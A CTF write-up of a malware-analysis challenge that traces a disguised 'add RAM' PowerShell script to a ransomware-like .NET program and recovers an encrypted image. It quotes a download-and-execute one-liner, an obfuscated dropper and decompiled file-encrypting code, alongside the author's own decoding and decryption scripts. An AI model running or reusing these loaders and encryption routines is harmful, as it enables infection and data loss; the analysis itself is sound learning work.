---
title: "Schematics NPC CTF 2025 Finals"
description: "Write ups from the challenge that I solved alongside with collaboration of my team HARO2b in Finals of SCHEMATICS NPC CTF 2025"
pubDate: "Nov 16 2025"
heroImage: "/images/sch/HeaderNPC.jpg"
---

Write ups from the challenge that I solved alongside with collaboration of my team `HARO2b` in Finals of SCHEMATICS NPC CTF 2025 CTF. Acquiring Top 5 leaderboard and this is my team score when it ended :

![](/images/sch/result.jpg)

## Download RAM
### Description

Kata temen ku ini script yang bisa dipake buat
nambah RAM. Tapi kok foto kesukaan ku jadi gini
yak?
ps. malicious btw

```ps1
$r='xMHcuUGd5JWYnl2ZtIzMv4Wah12LtFmctUGZhJ3ZwV3LlVXcu9Ga4BzLt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa';$b=($r[-1..-($r.Le
ngth)] -join
'');$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]
::FromBase64String($b));iex (iwr $u -UseBasicParsing)
```

### Solution

We given a script that 
1. recovering an URL that being encoded with reverse + base64 
2. download a remote powershell script from that URL 
3. execute it in memory. 

![](/images/sch/ram/0.png)

After we decode it, the result is link to the https://raw.githubusercontent.com/0xhonque/upgrade-ram/main/32-gigabyte.ps1.

```ps1
(...)
$haalloobim=@('ALUfXSMb', 'kzPJTOhj', 'zJFYUuHT', 'hnUdOCdf', 'CFgkifyq', 'ivreMlLH', 'EImewcER', 'QBqwTcWa', 'mKfgwpoe', 'ljppZrtv', 'hWjXjngK', 'OmokJxpb', 'tbxKOpby', 'WRLglWqY', 'ewBQTJcP', 'HFFotQRb', 'ejnZSAFp', 'LggnGysX', 'sgvMVlXu', 'eUOkuZrL', 'FKDNtidm', 'Mmvmfqbq', 'oTRBcTKD', 'CMZDzfvR', 'BhKJxNAT', 'HIoywfdZ', 'QjTjAljX', 'JvezFEPY', 'oOEchGBO', 'YZkLcLLL', 'EHwCZdmn', 'yZvfhDOm', 'jzQFgzZO', 'WlmHBGKE', 'UUoFVJvG',  
...
'AQJWDRRV', 'pETLcqHt', 'fDfQrcQM', 'VWfIjXOd', 'gRSmsNAt', 'ondQkegj', 'ZBmeWStl', 'KpnjZzha', 'sGTiuoCj', 'rkkecwNp', 'TXjIVoTU', 'BNUoIOkn', 'qADpdAuW', 'GJTiuGgc', 'fUXCAhEA', 'HtXfHVZz', 'dWWmOMbY', 'PJBHRjbo', 'qYWfCaIP', 'hxHMomYi', 'xzWGpQvy', 'gcHnBPRK', 'IDXYkbip', 'aUPFgoAI', 'TAQuTpfd', 'TXklrYpf', 'LJrJCwdN', 'IYeTUdeK', 'OTQFJnDi', 'kmIUZgtV', 'xJhXyEmf', 'QiWickIx', 'iMOfsJcU');$jjcho = "";foreach ($winter in $haalloobim) {$jjcho += (Get-Variable -Name $winter -ValueOnly)};$mirai = [System.Convert]::FromBase64String($jjcho);$daffainfo = New-Object IO.MemoryStream(, $mirai);$hygge = New-Object IO.Compression.GzipStream($daffainfo, [IO.Compression.CompressionMode]::Decompress);$rootkids = New-Object IO.MemoryStream;$hygge.CopyTo($rootkids);$hygge.Dispose(); $daffainfo.Dispose();$djumanto = $rootkids.ToArray(); $rootkids.Dispose();$hanz = (Get-Location).Path;$revprm = Join-Path $hanz "WinDriver.exe";[IO.File]::WriteAllBytes($revprm, $djumanto);$etern1tydark = "ssecorP-tratS";$requiiem = $etern1tydark[-1..-($etern1tydark.Length)] -join '';& $requiiem -FilePath $revprm
```

Accessing the URL, we got a lot of crayz ass base64. We copy it and at the end of the script there is some variable declared.

```python
import re
import base64
import gzip
from pathlib import Path

PS_FILE = "32-gigabyte.ps1"      # nama file ps1-mu
OUT_FILE = "WinDriver_decoded.bin"  # output hasil decompress


def main():
    ps_path = Path(PS_FILE)
    if not ps_path.exists():
        raise FileNotFoundError(f"File tidak ditemukan: {ps_path}")

    # Baca isi script PowerShell
    text = ps_path.read_text(encoding="utf-8", errors="ignore")

    # 1) Ambil semua assignment: $NamaVar='...';
    #    Simpan ke dict: nama -> value
    var_assign_re = re.compile(
        r"\$([A-Za-z0-9_]+)\s*=\s*'([^']*)'",
        re.DOTALL
    )
    var_map = {}
    for name, value in var_assign_re.findall(text):
        var_map[name] = value

    if "ALUfXSMb" not in var_map:
        print("[!] Warning: ALUfXSMb tidak ditemukan di var_map")

    # 2) Ambil isi array $haalloobim=@('ALUfXSMb', 'kzPJTOhj', ...);
    ha_re = re.compile(
        r"\$haalloobim\s*=\s*@\(([^)]*)\)",
        re.DOTALL
    )
    m = ha_re.search(text)
    if not m:
        raise ValueError("Tidak menemukan definisi $haalloobim di file")

    ha_inside = m.group(1)

    # Ambil semua 'NamaVar' di dalam array
    ha_names = re.findall(r"'([^']+)'", ha_inside)
    if not ha_names:
        raise ValueError("Tidak ada nama variabel di dalam $haalloobim")

    print(f"[+] Jumlah variabel dalam haalloobim: {len(ha_names)}")

    # 3) Susun base64 string besar seperti di PowerShell
    pieces = []
    for name in ha_names:
        if name not in var_map:
            raise KeyError(f"Variabel {name} tidak ditemukan di script")
        pieces.append(var_map[name])

    b64_data = "".join(pieces)

    # Bersihkan whitespace
    b64_data = "".join(b64_data.split())

    # Pastikan padding base64 benar
    missing = (-len(b64_data)) % 4
    if missing:
        b64_data += "=" * missing

    print(f"[+] Panjang base64 final: {len(b64_data)} karakter")

    # 4) Base64 decode
    try:
        compressed_bytes = base64.b64decode(b64_data)
    except Exception as e:
        raise ValueError(f"Gagal base64 decode: {e}")

    print(f"[+] Ukuran data terkompres: {len(compressed_bytes)} bytes")

    # 5) Gzip decompress
    try:
        decompressed_bytes = gzip.decompress(compressed_bytes)
    except Exception as e:
        raise ValueError(f"Gagal gzip decompress: {e}")

    print(f"[+] Ukuran data setelah decompress: {len(decompressed_bytes)} bytes")

    out_path = Path(OUT_FILE)
    out_path.write_bytes(decompressed_bytes)

    print(f"[+] Payload berhasil didecode & disimpan ke: {out_path.resolve()}")


if __name__ == "__main__":
    main()
```

With script above we can deobfuscate it and got the program binary, the process is :
1. parse all of assignment
2. parse the $haalloobim array
3. Sort the variable based on $haalloobim list, then combine it so we get an big ass base64
4. base64 decode then gzip decompress

```c#
// \\wsl.localhost\kali-linux\home\byte\schematics\final\rev\ram\WinDriver_decoded.bin
// File format: .NET bundle 6.0

Entries:
 Meddle.runtimeconfig.json (525 bytes)
 cs/Microsoft.VisualBasic.Forms.resources.dll (25896 bytes)
 cs/PresentationCore.resources.dll (108808 bytes)
 (...)
 Meddle.r2r.dll (86822912 bytes)
 Meddle.deps.json (36804 bytes)
```

Next is to decompile the ps1 bin. Decompiling with ghidra, we found that this is written in .NET. So we move to ILSpy to analyze easily. Looking at the entries, the app name is Meddle and we open the Meddle.dll.

```c#

// Meddle.dll
// Meddle, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Global type: <Module>
// Entry point: \u00a0.\u1680.\u00a0
// Architecture: x64
// This assembly contains unmanaged code.
// Runtime: v4.0.30319
// This assembly was compiled using the /deterministic option.
// Hash algorithm: SHA1

using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Versioning;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: TargetFramework(".NETCoreApp,Version=v8.0", FrameworkDisplayName = ".NET 8.0")]
[assembly: AssemblyCompany("Meddle")]
[assembly: AssemblyConfiguration("Release")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyInformationalVersion("1.0.0")]
[assembly: AssemblyProduct("Meddle")]
[assembly: AssemblyTitle("Meddle")]
[assembly: TargetPlatform("Windows7.0")]
[assembly: SupportedOSPlatform("Windows7.0")]
[assembly: AssemblyVersion("1.0.0.0")]
[module: RefSafetyRules(11)]
```

Upon opening it, we know that Meddle is an obfuscated .NET 8 application, delivered as a single-file bundle, whose main entrypoint \u00a0.\u1680.\u00a0 ultimately reads a specific .enc file and decrypts it.

```c#
// Meddle, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// \u00a0.\u00a0
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using <PrivateImplementationDetails>{7067DEED-3084-4434-8B3A-62AC20B66E44};

public class \u00a0 : Form
{
	private IContainer m_\u00a0;

	private Label m_\u00a0;

	private Button m_\u00a0;

	private Button m_\u1680;

	public \u00a0()
	{
		\u00a0();
		base.StartPosition = FormStartPosition.CenterScreen;
	}

	private void \u00a0(object P_0, EventArgs P_1)
	{
		MessageBox.Show(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u00a0(), 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u1680(), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
	}

	private void \u1680(object P_0, EventArgs P_1)
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2000(),
				UseShellExecute = true
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2001() + ex.Message, 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2002(), MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	protected override void Dispose(bool P_0)
	{
		if (P_0 && this.m_\u00a0 != null)
		{
			this.m_\u00a0.Dispose();
		}
		base.Dispose(P_0);
	}

	private void \u00a0()
	{
		this.m_\u00a0 = new Label();
		this.m_\u00a0 = new Button();
		this.m_\u1680 = new Button();
		SuspendLayout();
		this.m_\u00a0.AutoSize = true;
		this.m_\u00a0.Font = new Font(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2003(), 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.m_\u00a0.Location = new Point(282, 145);
		this.m_\u00a0.Margin = new Padding(4, 0, 4, 0);
		this.m_\u00a0.Name = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2004();
		this.m_\u00a0.Size = new Size(352, 40);
		this.m_\u00a0.TabIndex = 0;
		this.m_\u00a0.Text = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2005();
		this.m_\u00a0.TextAlign = ContentAlignment.MiddleCenter;
		this.m_\u00a0.Location = new Point(282, 251);
		this.m_\u00a0.Margin = new Padding(4, 3, 4, 3);
		this.m_\u00a0.Name = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2006();
		this.m_\u00a0.Size = new Size(117, 58);
		this.m_\u00a0.TabIndex = 1;
		this.m_\u00a0.Text = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2007();
		this.m_\u00a0.UseVisualStyleBackColor = true;
		this.m_\u00a0.Click += \u00a0;
		this.m_\u1680.Location = new Point(517, 251);
		this.m_\u1680.Margin = new Padding(4, 3, 4, 3);
		this.m_\u1680.Name = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2008();
		this.m_\u1680.Size = new Size(117, 58);
		this.m_\u1680.TabIndex = 2;
		this.m_\u1680.Text = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2009();
		this.m_\u1680.UseVisualStyleBackColor = true;
		this.m_\u1680.Click += \u1680;
		base.AutoScaleDimensions = new SizeF(7f, 15f);
		base.AutoScaleMode = AutoScaleMode.Font;
		base.ClientSize = new Size(933, 519);
		base.Controls.Add(this.m_\u1680);
		base.Controls.Add(this.m_\u00a0);
		base.Controls.Add(this.m_\u00a0);
		base.Margin = new Padding(4, 3, 4, 3);
		base.Name = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u200a();
		Text = 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u200a();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}
}
```

The \u00a0() (main) process is checking anti-debug, anti-VM with Debugger.IsAttached and helper \u2002, drop embedded resource to disk, call \u2000.\u00a0(text) then running Application.Run(new \u00a0()).

```c#
// Meddle, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// \u00a0.\u2000
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using \u00a0;
using <PrivateImplementationDetails>{7067DEED-3084-4434-8B3A-62AC20B66E44};
using Konscious.Security.Cryptography;

public static class \u2000
{
	public static void \u00a0(string P_0)
	{
		FileInfo[] files = new DirectoryInfo(P_0).GetFiles(7EBAC809-763C-4647-9811-BCA51CAE63D9.–(), SearchOption.AllDirectories);
		string processPath = Environment.ProcessPath;
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			try
			{
				if (!(fileInfo.Extension == 7EBAC809-763C-4647-9811-BCA51CAE63D9.—()) && !Path.GetFullPath(fileInfo.FullName).Equals(Path.GetFullPath(processPath), StringComparison.OrdinalIgnoreCase))
				{
					byte[] array2 = File.ReadAllBytes(fileInfo.FullName);
					string s = \u2000(fileInfo.Name + 7EBAC809-763C-4647-9811-BCA51CAE63D9.―() + \u2003.\u00a0(array2));
					File.WriteAllBytes(\u1680(fileInfo.FullName), Encoding.UTF8.GetBytes(s));
				}
			}
			catch (IOException)
			{
			}
			catch (UnauthorizedAccessException)
			{
			}
		}
	}

	private static string \u1680(string P_0)
	{
		string? path = Path.GetDirectoryName(P_0) ?? 7EBAC809-763C-4647-9811-BCA51CAE63D9.‐();
		string fileName = Path.GetFileName(P_0);
		string[] array = fileName.Split('.');
		string text;
		if (array.Length > 1)
		{
			text = string.Join(7EBAC809-763C-4647-9811-BCA51CAE63D9.•(), array, 0, array.Length - 1);
			_ = array[^1];
		}
		else
		{
			text = fileName;
		}
		string text2 = Path.Combine(path, 7EBAC809-763C-4647-9811-BCA51CAE63D9.․() + text + 7EBAC809-763C-4647-9811-BCA51CAE63D9.—());
		File.Move(P_0, text2);
		return text2;
	}

	private static string \u2000(string P_0)
	{
		string value = \u2003.\u1680(7EBAC809-763C-4647-9811-BCA51CAE63D9.‥());
		string value2 = \u2003.\u1680(7EBAC809-763C-4647-9811-BCA51CAE63D9.‧());
		string text = DateTime.Now.ToString(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2028());
		string[] array = P_0.Split('|');
		Random random = new Random(array[0].GetHashCode());
		byte[] bytes = RandomNumberGenerator.GetBytes(16);
		(int iterations, string spice) tuple = \u2001(text);
		int item = tuple.iterations;
		string item2 = tuple.spice;
		byte[] array2 = \u00a0(text, bytes, item2, item);
		DefaultInterpolatedStringHandler defaultInterpolatedStringHandler;
		if (random.Next() % 2 == 0)
		{
			byte[] bytes2 = RandomNumberGenerator.GetBytes(12);
			(byte[] ciphertext, byte[] tag) tuple2 = \u1680(array[1], array2, bytes2);
			byte[] item3 = tuple2.ciphertext;
			byte[] item4 = tuple2.tag;
			string text2 = \u2003.\u00a0(item3);
			int num = 100;
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < text2.Length; i += num)
			{
				int num2 = Math.Min(num, text2.Length - i);
				stringBuilder.Append(text2.AsSpan(i, num2));
				if (i + num2 < text2.Length)
				{
					stringBuilder.Append(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
				}
			}
			defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(174, 7);
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202a());
			defaultInterpolatedStringHandler.AppendFormatted(value);
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202b());
			defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(text));
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202c());
			defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(bytes));
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202c());
			defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(bytes2));
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
			defaultInterpolatedStringHandler.AppendFormatted(stringBuilder);
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
			defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(item4));
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202d());
			defaultInterpolatedStringHandler.AppendFormatted(value2);
			defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202e());
			return defaultInterpolatedStringHandler.ToStringAndClear();
		}
		byte[] bytes3 = RandomNumberGenerator.GetBytes(16);
		string text3 = \u2003.\u00a0(\u00a0(array[1], array2, bytes3));
		int num3 = 100;
		StringBuilder stringBuilder2 = new StringBuilder();
		for (int j = 0; j < text3.Length; j += num3)
		{
			int num4 = Math.Min(num3, text3.Length - j);
			stringBuilder2.Append(text3.AsSpan(j, num4));
			if (j + num4 < text3.Length)
			{
				stringBuilder2.Append(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
			}
		}
		defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(172, 6);
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202a());
		defaultInterpolatedStringHandler.AppendFormatted(value);
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202b());
		defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(text));
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202c());
		defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(bytes));
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202c());
		defaultInterpolatedStringHandler.AppendFormatted(\u2003.\u00a0(bytes3));
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
		defaultInterpolatedStringHandler.AppendFormatted(stringBuilder2);
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2029());
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202d());
		defaultInterpolatedStringHandler.AppendFormatted(value2);
		defaultInterpolatedStringHandler.AppendLiteral(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202e());
		return defaultInterpolatedStringHandler.ToStringAndClear();
	}

	private static byte[] \u00a0(string P_0, byte[] P_1, string P_2, int P_3)
	{
		char[] array = P_0.ToCharArray();
		Array.Reverse(array);
		string s = new string(array) + P_2;
		using Argon2id argon2id = new Argon2id(Encoding.UTF8.GetBytes(s));
		argon2id.Salt = P_1;
		argon2id.DegreeOfParallelism = 8;
		argon2id.MemorySize = 65536;
		argon2id.Iterations = 4;
		return argon2id.GetBytes(32);
	}

	private static (int iterations, string spice) \u2001(string P_0)
	{
		long ticks = DateTime.ParseExact(P_0, 7EBAC809-763C-4647-9811-BCA51CAE63D9.\u2028(), null).Ticks;
		int item = 30000 + (int)(ticks % 1337);
		string text = \u2002(\u2002(P_0 + \u2003.\u1680(7EBAC809-763C-4647-9811-BCA51CAE63D9.\u202f())));
		for (int i = 0; i < ticks % 67; i++)
		{
			text = \u2002(text + P_0);
		}
		return (iterations: item, spice: text);
	}

	private static byte[] \u00a0(string P_0, byte[] P_1, byte[] P_2)
	{
		byte[] array = \u2003.\u2000(P_0);
		using Aes aes = Aes.Create();
		aes.Key = P_1;
		aes.IV = P_2;
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
		{
			cryptoStream.Write(array, 0, array.Length);
		}
		return memoryStream.ToArray();
	}

	private static (byte[] ciphertext, byte[] tag) \u1680(string P_0, byte[] P_1, byte[] P_2)
	{
		byte[] array = \u2003.\u2000(P_0);
		byte[] array2 = new byte[array.Length];
		byte[] array3 = new byte[16];
		using (AesGcm aesGcm = new AesGcm(P_1))
		{
			aesGcm.Encrypt(P_2, array, array2, array3);
		}
		return (ciphertext: array2, tag: array3);
	}

	public static string \u2002(string P_0)
	{
		SHA256Managed sHA256Managed = new SHA256Managed();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(P_0));
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString(7EBAC809-763C-4647-9811-BCA51CAE63D9.′()));
		}
		return stringBuilder.ToString();
	}
}
```

The helper class 7EBAC809-763C-4647-9811-BCA51CAE63D9 stores an obfuscated byte array and a string table. Its static constructor XORs each byte with (i ^ 0xAA) and the methods like –(), —(), ―() slice the decoded byte array at pre-defined offsets. Re-implementing that logic shows:
1. 7EBAC...–() returns "*" so it processes all files under the given directory.
2. 7EBAC...—() returns ".enc", the extension used for encrypted output files.
3. 7EBAC...―() returns "|" which is used as a separator.
4. \u2003.\u00a0(byte[]) is a simple base64 encoder.

The encryption wrapper therefore does:
1. For each file in the directory (recursively), except files with .enc extension and the Meddle binary itself (Environment.ProcessPath), read all bytes.
2. Build a string "FileName|<Base64OriginalBytes>".
3. Pass that string into the core function \u2000(string P_0), which returns a text blob containing metadata and ciphertext.
4. Rename the original file to a new name with some prefix plus .enc and write the encrypted text into it.

Here \u2002 is a SHA-256 helper that returns a hex string, and 7EBAC...\u202f() base64-decodes to the Pink Floyd lyric: `And_no_one_sings_me_lullabies__And_no_one_makes_me_close_my_eyes__So_I_throw_the_windows_wide__Call_to_you_across_the_sky`

The key derivation is implemented by private static byte[]. This means the Argon2id password is reverse(timestamp) + spice, with a random 16-byte salt, and Argon2 parameters: time_cost 4, memory_cost 65536 KB, parallelism 8, output length 32 bytes. 

After the key is computed, encryption proceeds in one of two modes:
1. AES-GCM mode (when random.Next() % 2 == 0). The code generates a 12-byte nonce, encrypts the base64 plaintext with AesGcm, and gets (ciphertext, tag). The final textual format is:
```text
============================================[Albatross]============================================
<b64(timestamp)>-<b64(salt)>-<b64(nonce)>
<ciphertext base64 wrapped at 100 chars per line>
<b64(tag)>
===================================[Labyrinths of coral caves]====================================
```
2. AES-CBC mode (when random.Next() % 2 == 1). The code generates a 16-byte IV and uses AES-CBC with PKCS7 padding. The final format is:
```text
============================================[Albatross]============================================
<b64(timestamp)>-<b64(salt)>-<b64(iv)>
<ciphertext base64 wrapped at 100 chars per line>
===================================[Labyrinths of coral caves]====================================
```
In other words, both modes share the same structure, but the GCM version has an extra line before the footer containing the tag (16 bytes, base64 length 24).

The challenge gives us a file named sendtoRizztore.fineshyt.enc and the goal is to decrypt it. Instead of running the ransomware, we can implement the whole decryption logic in Python by reproducing the timestamp parsing, spice building, Argon2 key derivation, and both AES modes exactly :

```python
#!/usr/bin/env python3
import sys
import re
import base64
import hashlib
from pathlib import Path
from datetime import datetime

from argon2.low_level import hash_secret_raw, Type
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ===== Constants reconstructed from Meddle.dll =====

HEADER_LINE  = "============================================["
FOOTER_LINE  = "====================================["
FOOTER_CLOSE = "]===================================="
META_SEP     = "-"

# secret lyrics from 7EBAC... \u202f base64
SECRET_LYRICS_B64 = (
    "QW5kX25vX29uZV9zaW5nc19tZV9sdWxsYWJpZXNfX0FuZF9ub19vbmVfbWFr"
    "ZXNfbWVfY2xvc2VfbXlfZXllc19fU29fSV90aHJvd190aGVfd2luZG93c193"
    "aWRlX19DYWxsX3RvX3lvdV9hY3Jvc3NfdGhlX3NreQ=="
)
SECRET_LYRICS = base64.b64decode(SECRET_LYRICS_B64).decode("utf-8")

def dotnet_ticks_from_timestamp(ts_str: str) -> int:
    """
    Reproduce DateTime.ParseExact(ts, \"yyyyMMdd-HHmmss\", null).Ticks
    .NET ticks = 100 ns since 0001-01-01.
    """
    dt = datetime.strptime(ts_str, "%Y%m%d-%H%M%S")
    epoch = datetime(1, 1, 1)
    delta = dt - epoch
    ticks = (
        delta.days * 24 * 60 * 60 * 10**7 +
        delta.seconds * 10**7 +
        delta.microseconds * 10
    )
    return ticks

def sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def build_spice(ts_str: str):
    """
    Implements \u2001(string P_0) from C#.
    """
    ticks = dotnet_ticks_from_timestamp(ts_str)
    base = ts_str + SECRET_LYRICS
    spice = sha256_hex(sha256_hex(base))
    for _ in range(ticks % 67):
        spice = sha256_hex(spice + ts_str)
    iterations = 30000 + (ticks % 1337)
    return spice, iterations

def derive_key(ts_str: str, salt: bytes, spice: str) -> bytes:
    """
    Implements \u00a0(string P_0, byte[] P_1, string P_2, int P_3) with Argon2id.
    Password = reverse(ts_str) + spice.
    """
    password = (ts_str[::-1] + spice).encode("utf-8")
    key = hash_secret_raw(
        secret=password,
        salt=salt,
        time_cost=4,
        memory_cost=65536,
        parallelism=8,
        hash_len=32,
        type=Type.ID,
    )
    return key

def pkcs7_unpad(data: bytes, block_size: int = 16) -> bytes:
    if not data:
        raise ValueError("Empty data during unpad")
    pad_len = data[-1]
    if pad_len == 0 or pad_len > block_size:
        raise ValueError("Invalid padding length")
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("Invalid padding bytes")
    return data[:-pad_len]

def parse_meddle_enc(path: Path):
    raw = path.read_text(encoding="utf-8", errors="ignore")

    # Normalize line endings
    raw = raw.replace("\r\n", "\n").replace("\r", "\n")
    lines = [ln for ln in raw.split("\n") if ln != ""]

    header = lines[0]
    footer = lines[-1]
    meta   = lines[1]
    middle = lines[2:-1]

    parts = meta.split(META_SEP)
    if len(parts) != 3:
        raise ValueError("Meta line must have 3 parts (timestamp-salt-iv/nonce)")

    b64_ts, b64_salt, b64_iv_or_nonce = parts
    ts_str   = base64.b64decode(b64_ts).decode("utf-8")
    salt     = base64.b64decode(b64_salt)
    iv_nonce = base64.b64decode(b64_iv_or_nonce)

    if len(salt) != 16:
        raise ValueError(f"Salt length is not 16 bytes: {len(salt)}")

    mode = "cbc"
    tag = None

    if len(middle) >= 2:
        last = middle[-1]
        if len(last) == 24 and re.fullmatch(r"[A-Za-z0-9+/=]+", last):
            try:
                candidate = base64.b64decode(last, validate=True)
                if len(candidate) == 16:
                    mode = "gcm"
                    tag = candidate
                    middle = middle[:-1]
            except Exception:
                pass

    ciphertext_b64 = "".join(middle)
    ciphertext = base64.b64decode(ciphertext_b64)

    return mode, ts_str, salt, iv_nonce, ciphertext, tag

def decrypt_meddle_file(enc_path: str, out_path: str):
    enc_path = Path(enc_path)
    mode, ts_str, salt, iv_nonce, ciphertext, tag = parse_meddle_enc(enc_path)

    print(f"[+] Mode: {mode.upper()}")
    print(f"[+] Timestamp: {ts_str}")
    print(f"[+] Salt length: {len(salt)}")

    spice, iters = build_spice(ts_str)
    print(f"[+] Spice length: {len(spice)} chars, pseudo-iterations: {iters}")

    key = derive_key(ts_str, salt, spice)
    print(f"[+] Key length: {len(key)} bytes")

    if mode == "gcm":
        if tag is None:
            raise ValueError("GCM mode but tag is missing")
        aesgcm = AESGCM(key)
        ct_plus_tag = ciphertext + tag
        plaintext = aesgcm.decrypt(iv_nonce, ct_plus_tag, associated_data=None)
    else:
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv_nonce), backend=backend)
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        plaintext = pkcs7_unpad(padded)

    out_path = Path(out_path)
    out_path.write_bytes(plaintext)
    print(f"[+] Decrypted to: {out_path.resolve()}")
    return plaintext

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file.enc> [output]")
        sys.exit(1)

    enc_file = sys.argv[1]
    if len(sys.argv) >= 3:
        out_file = sys.argv[2]
    else:
        out_file = enc_file + ".dec"

    decrypt_meddle_file(enc_file, out_file)
```

![](/images/sch/ram/2.png)

After running the script with the enc file we got a PNG, open it and we got the flag.

### Flag
SCH25{Strangers_passing_in_the_street__By_chance,_two_separate_glances_meet__And_I_am_you_and_what_I_see_is_me__And_do_I_take_you_by_the_hand__And_lead_you_through_the_land__And_help_me_understand_the_best_I_can?___requiiem_wuzz_here}